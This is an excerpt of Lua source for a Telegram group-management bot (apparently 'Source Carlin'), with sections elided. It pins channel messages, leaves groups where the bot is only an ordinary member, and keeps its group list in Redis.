tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(Carlin..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Carlin,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevRio:srem(Carlin..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(Carlin..'Rio:Groups',v)  
end
...
DevRio:sadd(Carlin..'Rio:Groups',v)  
end end,nil) end
end
--     Source Carlin     --
end
